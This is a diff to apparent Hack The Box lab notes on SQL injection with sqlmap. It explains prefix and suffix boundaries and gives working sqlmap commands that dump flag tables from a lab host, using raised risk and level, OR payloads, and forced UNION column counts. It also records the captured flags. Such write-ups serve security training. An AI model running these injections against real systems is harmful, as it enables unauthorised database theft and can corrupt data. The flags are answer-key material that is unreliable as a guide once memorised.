@@ -10,8 +10,8 @@
        %'))    UNION SELECT...   -- -
 ```
 
-- **Vector** — the SQL payload that does the work (UNION SELECT, AND 1=1, SLEEP, etc.)
-- **Boundaries** — prefix/suffix that break out of the original query context and comment away the remainder
+- **Vector** — the SQL payload that does the actual work (UNION SELECT, AND 1=1, SLEEP, etc.)
+- **Boundaries** — the prefix and suffix that break out of the original query and comment away the rest
 
 ---
 
@@ -20,6 +20,7 @@
 ```bash
 sqlmap -u "TARGET/?q=test" --prefix="%'))" --suffix="-- -"
 ```
+> Forces a specific prefix and suffix around every payload. Use this when sqlmap's default boundary set doesn't break out of the query's wrapper characters. Replace `TARGET` and the parameter with your target's values, and adjust the prefix/suffix to match the actual query structure.
 
 For the vulnerable code:
 ```php
@@ -53,6 +54,7 @@ sqlmap -u "TARGET" --risk=3
 # Test cookies, User-Agent, Referer headers (not tested at level 1)
 sqlmap -u "TARGET" --cookie="..." --level=2
 ```
+> `--risk=3` enables OR-based payloads needed for login form injection. `--level=2` makes sqlmap test cookie and header values that it ignores by default. Only raise these above defaults when the default scan finds nothing.
 
 > **Why OR payloads are gated**: They can match all rows. In an `UPDATE` or `DELETE` query (rare but possible), an OR payload can corrupt or wipe the table. Raise `--risk` deliberately when you know the underlying query is `SELECT`.
 
@@ -88,13 +90,14 @@ sqlmap -u "TARGET" --cookie="..." --level=2
 
 ### Case 5 — OR SQLi
 
-OR payloads are disabled by default (risk of mass-matching). Raise risk to 3.
+OR payloads are disabled by default. They can match every row in a table, which risks corrupting data. Raise `--risk` to 3 to enable them.
 
 ```bash
 sqlmap -u "http://154.57.164.72:30732/case5.php?id=1" \
   --dbms=mysql --batch --risk=3 --technique=BEU \
   --dump -T flag5
 ```
+> Case 5 uses OR-based injection which sqlmap skips at default risk. `--risk=3` enables OR payloads. `--technique=BEU` tests Boolean, Error, and UNION (skips slow time-based). Replace the IP, port, and table name for other targets.
 
 **flag5:** `HTB{700_much_r15k_bu7_w0r7h_17}`
 
@@ -102,11 +105,11 @@ sqlmap -u "http://154.57.164.72:30732/case5.php?id=1" \
 
 ### Case 6 — Non-standard boundaries
 
-The query wraps `col` in backtick + parenthesis: ``SELECT ... WHERE (`<col>`) ...``. Only the literal `id` returns rows because:
-- `` `id` `` is a valid column reference, truthy for non-zero values
-- `` `name` `` etc. are valid columns but cast to 0 in boolean context
+The query wraps `col` in a backtick and parenthesis: ``SELECT ... WHERE (`<col>`) ...``. Only the literal `id` returns rows because:
+- `` `id` `` is a valid column reference and evaluates as true for non-zero values
+- `` `name` `` and similar columns are valid but cast to 0 in a boolean context
 
-Need `--prefix='`)' --suffix='-- -'` to break out of the backtick+paren wrapper. Default level doesn't include this boundary pair — raise to `--level=4` (or higher).
+You need `--prefix='`)' --suffix='-- -'` to break out of the wrapper. The default level does not include this boundary pair — raise to `--level=4` or higher.
 
 ```bash
 sqlmap -u "http://154.57.164.72:30732/case6.php?col=id" \
@@ -115,6 +118,7 @@ sqlmap -u "http://154.57.164.72:30732/case6.php?col=id" \
   --technique=U --level=4 --no-cast \
   --dump -T flag6
 ```
+> Case 6 with non-standard backtick+parenthesis query wrappers. `--prefix='`)` and `--suffix='-- -'` manually specify the break-out characters. `--level=4` makes sqlmap test the boundary pair needed. `--no-cast` prevents silent UNION failures. Replace the IP, port, and table name for other targets.
 
 The injected query becomes:
 ```sql
@@ -129,7 +133,7 @@ SELECT ... WHERE (`id`) UNION ALL SELECT NULL,NULL,NULL,NULL,<data>,NULL-- -`) .
 
 ### Case 7 — UNION with adjustments
 
-UNION-based but the default UNION column detection fails due to type-casting issues. Force `--no-cast` and specify column count.
+UNION injection works here, but the default column count detection fails due to type-casting issues. Force `--no-cast` and specify the column count manually.
 
 ```bash
 sqlmap -u "http://154.57.164.72:30732/case7.php?id=1" \
@@ -137,6 +141,7 @@ sqlmap -u "http://154.57.164.72:30732/case7.php?id=1" \
   --union-cols=5 --no-cast \
   --dump -T flag7
 ```
+> Case 7 with UNION column count mismatch. `--union-cols=5` forces the column count instead of letting sqlmap auto-detect it. `--no-cast` fixes the type-casting issue that prevents data from being returned. Replace the IP, port, column count, and table name for other targets.
 
 **flag7:** `HTB{un173_7h3_un173d}`
 
